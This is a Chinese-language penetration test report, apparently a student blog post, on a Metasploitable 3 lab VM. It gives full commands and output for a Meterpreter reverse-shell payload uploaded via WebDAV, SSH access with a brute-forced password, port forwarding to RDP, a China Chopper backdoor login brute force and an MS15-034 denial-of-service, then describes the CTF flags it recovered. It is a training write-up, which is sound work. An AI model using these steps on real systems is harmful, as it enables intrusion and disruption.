      <url>/2021/12/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>靶机：metasploitable 3，有许多漏洞供练习，并藏有15个隐藏彩蛋，老师发的镜像删去了部分有损坏的flag</p><h1 id="一、信息搜集阶段"><a href="#一、信息搜集阶段" class="headerlink" title="一、信息搜集阶段"></a>一、信息搜集阶段</h1><ol><li><p>通过nmap扫描发现window靶机的ip地址<code>10.0.2.4</code>，PS：kali攻击机ip：10.0.2.15</p></li><li><p>启动msfconfig，使用nmap扫描全端口，发现靶机开启了如下端口，及其服务版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -a win08-r2</span><br><span class="line">[*] Added workspace: win08-r2</span><br><span class="line">[*] Workspace: win08-r2</span><br><span class="line">msf &gt; db_nmap -sS -sV -sC -p- -n -v 10.0.2.4</span><br><span class="line">msf &gt; services </span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line">host      port   proto  name        state  info</span><br><span class="line">----      ----   -----  ----        -----  ----</span><br><span class="line">10.0.2.4  21     tcp    ftp         open   Microsoft ftpd</span><br><span class="line">10.0.2.4  22     tcp    ssh         open   OpenSSH 7.1 protocol 2.0</span><br><span class="line">10.0.2.4  80     tcp    http        open   Microsoft IIS httpd 7.5</span><br><span class="line">10.0.2.4  1617   tcp    java-rmi    open   Java RMI</span><br><span class="line">10.0.2.4  3000   tcp    http        open   WEBrick httpd 1.3.1 Ruby 2.3.1 (</span><br><span class="line">                                           2016-04-26)</span><br><span class="line">10.0.2.4  4848   tcp    ssl/http    open   Oracle Glassfish Application Ser</span><br><span class="line">                                           ver</span><br><span class="line">10.0.2.4  5985   tcp    http        open   Microsoft HTTPAPI httpd 2.0 SSDP</span><br><span class="line">                                           /UPnP</span><br><span class="line">10.0.2.4  8022   tcp    http        open   Apache Tomcat/Coyote JSP engine</span><br><span class="line">                                           1.1</span><br><span class="line">10.0.2.4  8080   tcp    http        open   Sun GlassFish Open Source Editio</span><br><span class="line">                                           n  4.0</span><br><span class="line">10.0.2.4  8282   tcp    http        open   Apache Tomcat/Coyote JSP engine</span><br><span class="line">                                           1.1</span><br><span class="line">10.0.2.4  8484   tcp    http        open   Jetty winstone-2.8</span><br><span class="line">10.0.2.4  8585   tcp    http        open   Apache httpd 2.2.21 (Win64) PHP/</span><br><span class="line">                                           5.3.10 DAV/2</span><br><span class="line">10.0.2.4  9200   tcp    wap-wsp     open</span><br><span class="line">10.0.2.4  49153  tcp    msrpc       open   Microsoft Windows RPC</span><br><span class="line">10.0.2.4  49154  tcp    msrpc       open   Microsoft Windows RPC</span><br><span class="line">10.0.2.4  49179  tcp    java-rmi    open   Java RMI</span><br><span class="line">10.0.2.4  49180  tcp    tcpwrapped  open</span><br></pre></td></tr></table></figure></li></ol><h1 id="二、漏洞分析与利用阶段"><a href="#二、漏洞分析与利用阶段" class="headerlink" title="二、漏洞分析与利用阶段"></a>二、漏洞分析与利用阶段</h1><h2 id="（1）WebDAV服务漏洞"><a href="#（1）WebDAV服务漏洞" class="headerlink" title="（1）WebDAV服务漏洞"></a>（1）WebDAV服务漏洞</h2><p>通过kali提供的WebDAV服务漏洞利用工具DAVTest。该工具会自动检测权限，寻找可执行文件的权限。一旦发现，用户就可以上传内置的后门工具，对服务器进行控制。同时，该工具可以上传用户指定的文件，便于后期利用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root💀kali)-[~]</span><br><span class="line">└─# davtest -url http://10.0.2.4:8585/uploads/                                                              </span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN            SUCCEED:                http://10.0.2.4:8585/uploads</span><br><span class="line">********************************************************</span><br><span class="line">NOTE    Random string for this session: TUv6QRb</span><br><span class="line">********************************************************</span><br><span class="line"> Creating directory</span><br><span class="line">MKCOL           SUCCEED:                Created http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb</span><br><span class="line">********************************************************</span><br><span class="line"> Sending test files</span><br><span class="line">PUT     php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php</span><br><span class="line">PUT     cgi     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cgi</span><br><span class="line">PUT     shtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.shtml</span><br><span class="line">PUT     jhtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jhtml</span><br><span class="line">PUT     aspx    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.aspx</span><br><span class="line">PUT     jsp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jsp</span><br><span class="line">PUT     html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html</span><br><span class="line">PUT     txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt</span><br><span class="line">PUT     pl      SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.pl</span><br><span class="line">PUT     asp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.asp</span><br><span class="line">PUT     cfm     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cfm</span><br><span class="line">********************************************************</span><br><span class="line"> Checking for test file execution</span><br><span class="line">EXEC    php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php</span><br><span class="line">EXEC    cgi     FAIL</span><br><span class="line">EXEC    shtml   FAIL</span><br><span class="line">EXEC    jhtml   FAIL</span><br><span class="line">EXEC    aspx    FAIL</span><br><span class="line">EXEC    jsp     FAIL</span><br><span class="line">EXEC    html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html</span><br><span class="line">EXEC    txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt</span><br><span class="line">EXEC    pl      FAIL</span><br><span class="line">EXEC    asp     FAIL</span><br><span class="line">EXEC    cfm     FAIL</span><br></pre></td></tr></table></figure><p>检测发现可以上传php文件</p><p>生成攻击载荷并上传：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=6666 -f raw &gt;demon.php</span><br><span class="line"></span><br><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ davtest -url http://10.0.2.4:8585/uploads/ -uploadfile demon.php -uploadloc DavTestDir_12ja05EL/66.php</span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN            SUCCEED:                http://10.0.2.4:8585/uploads</span><br><span class="line">********************************************************</span><br><span class="line"> unless  Uploading file</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 10.0.2.15</span><br><span class="line">LHOST =&gt; 10.0.2.15</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 8888</span><br><span class="line">LPORT =&gt; 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.2.15:8888 </span><br><span class="line">[*] Meterpreter session 1 opened (10.0.2.15:8888 -&gt; 10.0.2.4:49914 ) at 2021-12-22 06:41:03 -0500</span><br></pre></td></tr></table></figure><p>得到Meterpreter，成功！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    detach                    Detach the meterpreter session (for http/https)</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    lcd           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br></pre></td></tr></table></figure><h2 id="（2）ssh测试"><a href="#（2）ssh测试" class="headerlink" title="（2）ssh测试"></a>（2）ssh测试</h2><ol><li><p>首先，通过hydra进行密码爆破，得到Administrator账号密码：admin321，即可建立ssh链接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ ssh Administrator@10.0.2.4</span><br><span class="line">Administrator@10.0.2.4&#x27;s password: </span><br><span class="line">-sh-4.3$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>检测3389端口，发现端口是打开的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ nmap -p 3389 10.0.2.4                                                                     </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-17 01:57 EST</span><br><span class="line">Nmap scan report for 10.0.2.4</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">3389/tcp filtered ms-wbt-server</span><br><span class="line">MAC Address: 08:00:27:0B:0C:01 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds</span><br></pre></td></tr></table></figure></li><li><p>端口转发，并进行连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ ssh -L 3389:localhost:3389 Administrator@10.0.2.4</span><br><span class="line">Administrator@10.0.2.4&#x27;s password: </span><br><span class="line">Last login: Thu Dec 16 22:54:07 2021 from 10.0.2.15</span><br><span class="line">-sh-4.3$ </span><br><span class="line">(kali㉿kali)-[~]</span><br><span class="line">└─$ rdesktop 127.0.0.1:3389</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/17/QcGxjgtXmf9631H.png" alt="desktop"></p></li><li><p>实现可以直接在kali攻击机上进行对靶机的操作</p></li></ol><p>（3）caidao</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search caidao</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                            Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/caidao_php_backdoor_exec     2015-10-27       excellent  Yes    China Chopper Caidao PHP Backdoor Code Execution</span><br><span class="line">   1  auxiliary/scanner/http/caidao_bruteforce_login                   normal     No     Chinese Caidao Backdoor Bruteforce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/caidao_bruteforce_login                                                                                                        </span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/scanner/http/caidao_bruteforce_login</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; set RHOSTS 10.0.2.4</span><br><span class="line">RHOSTS =&gt; 10.0.2.4</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; set TARGETURI /caidao.asp</span><br><span class="line">TARGETURI =&gt; /caidao.asp</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; run</span><br><span class="line"></span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;admin&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;123456&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;12345&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;123456789&#x27;</span><br><span class="line">[+] 10.0.2.4:80 - Success: &#x27;password&#x27;</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>找到连接口令：‘password’</p><h2 id="（4）80端口—http"><a href="#（4）80端口—http" class="headerlink" title="（4）80端口—http"></a>（4）80端口—http</h2><p>MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞（远程蓝屏代码）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms15_034</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                                  Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/dos/http/ms15_034_ulonglongadd                               normal  Yes    MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service</span><br><span class="line">   1  auxiliary/scanner/http/ms15_034_http_sys_memory_dump                   normal  Yes    MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/ms15_034_http_sys_memory_dump                                                                                                  </span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/dos/http/ms15_034_ulonglongadd </span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; set RHOSTS 10.0.2.4</span><br><span class="line">RHOSTS =&gt; 10.0.2.4</span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/dos/http/ms15_034_ulonglongadd):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     10.0.2.4         yes       The target host(s), see https://github.com/rapid7/metasploit-framewor</span><br><span class="line">                                         k/wiki/Using-Metasploit</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                no        URI to the site (e.g /site/) or a valid file resource (e.g /welcome.p</span><br><span class="line">                                         ng)</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span><br><span class="line"></span><br><span class="line">[*] DOS request sent</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span><br></pre></td></tr></table></figure><p>结果靶机没有蓝屏，而是立即重启了，也蛮有趣的</p><h1 id="三、后渗透阶段（flag挖掘）"><a href="#三、后渗透阶段（flag挖掘）" class="headerlink" title="三、后渗透阶段（flag挖掘）"></a>三、后渗透阶段（flag挖掘）</h1><p>很像是在打CTF，做得蛮开心的~</p><h2 id="1-the-joker"><a href="#1-the-joker" class="headerlink" title="1. the_joker"></a>1. the_joker</h2><ol><li><p>发现80端口是打开的，用浏览器打开，不难从html页面发现隐藏的HEX代码，通过<code>curl http://10.0.2.4/ &gt; data.htmlcat data.html | perl -ne &#39;print $1 if(/value\=\&quot;(\w+)\&quot;\&gt;/g)&#39; &gt; data.hex</code> 获得hex.txt见附件</p></li><li><p>不难猜想可由hex转图片，于是写出hex2png.py，获得flag。</p></li><li><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hex.txt&#x27;</span>) <span class="keyword">as</span> f, <span class="built_in">open</span>(<span class="string">&#x27;data.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> fout:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        fout.write(binascii.unhexlify(line))</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/21KMvxdUwutezon.png" alt="joker"></p><h2 id="2-Ace-of-Hearts"><a href="#2-Ace-of-Hearts" class="headerlink" title="2. Ace_of_Hearts"></a>2. Ace_of_Hearts</h2><ol><li>打开目录不难找到一张普通的红桃A，文件异常之大，不难发现端倪，可能是多文件隐藏。</li><li>查看二进制格式，把第一个jpg文件删去，即得到flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/nMzVcvW26uNOpyC.png" alt="ace_of_hearts"></p><h2 id="3-Jack-of-Hearts"><a href="#3-Jack-of-Hearts" class="headerlink" title="3.  Jack_of_Hearts"></a>3.  Jack_of_Hearts</h2><ol><li><p>不难在document目录下发现Jack_of_Hearts.docx，考虑单文件docx中的PNG隐藏文件</p></li><li><p>将docx文件后缀改为.zip就会得到一个压缩文件，在\word\media中就能找到隐藏的图像flag文件）</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/kmhuVc8ApNgj3yM.png" alt="jack_of_hearts"></p><h2 id="4-Six-of-Diamonds"><a href="#4-Six-of-Diamonds" class="headerlink" title="4. Six_of_Diamonds"></a>4. Six_of_Diamonds</h2><ol><li>在C:\inetpub\wwwroot目录下不难找到six_of_diamonds压缩包，发现经过加密</li><li>首先考虑是不是伪加密，将全局方式位标记改为 00 00，未能成功打开，说明确实有密码</li><li>使用ARCHPR进行爆破，密码为vagrant，获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/MxJXZNs3TrvQhou.png" alt="six_of_diamonds"></p><h2 id="5-King-of-Diamonds"><a href="#5-King-of-Diamonds" class="headerlink" title="5. King_of_Diamonds"></a>5. King_of_Diamonds</h2><p>在C:\wamp\www\wordpress\wp-content\uploads\2017\09目录下直接找到King_of_Diamonds.png</p><p><img src="https://s2.loli.net/2021/12/17/cZ3u2kmh9aUxvg4.png" alt="king_of_damonds"></p><h2 id="6-Three-of-Spades"><a href="#6-Three-of-Spades" class="headerlink" title="6. Three_of_Spades"></a>6. Three_of_Spades</h2><ol><li><p>此图片我一通好找，突然想起可能是被隐藏了，最终在C:\windows目录下找到了</p></li><li><p>但是仍然无法打开，二进制格式打开根据文件头猜测文件被处理过，对文件异或操作，获得正常png格式</p></li><li><p>处理图片的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">_<span class="keyword">in</span> = <span class="string">&#x27;three_of_spades.png&#x27;</span>;</span><br><span class="line">_out = _<span class="keyword">in</span> + <span class="string">&#x27;.out&#x27;</span>;</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(_<span class="keyword">in</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    b[i] ^= <span class="number">0x0f</span></span><br><span class="line"><span class="built_in">open</span>(_out, <span class="string">&#x27;wb&#x27;</span>).write(b)</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/4yeYRt9ZzgNpn8W.png" alt="three_of_spades"></p><h2 id="7-Seven-of-Spades"><a href="#7-Seven-of-Spades" class="headerlink" title="7. Seven_of_Spades"></a>7. Seven_of_Spades</h2><ol><li>在Libraries\Documents目录下发现Seven of Spades.pdf，不难想到是隐藏在文件里了，使用pdf-parser即可获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/gLJlobmzvewOQI1.png" alt="seven_of_spades"></p><h2 id="8-Four-of-Clubs"><a href="#8-Four-of-Clubs" class="headerlink" title="8. Four_of_Clubs"></a>8. Four_of_Clubs</h2><ol><li>类似7，Libraries\Music目录下找到Four_of_Clubs.wav，使用binwalk分离其中的flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/PWTZSrDiycuUKgX.png" alt="four_of-clubs"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫笔记</title>
      <link href="/2021/10/22/Python%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/10/22/Python%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/</url>
      
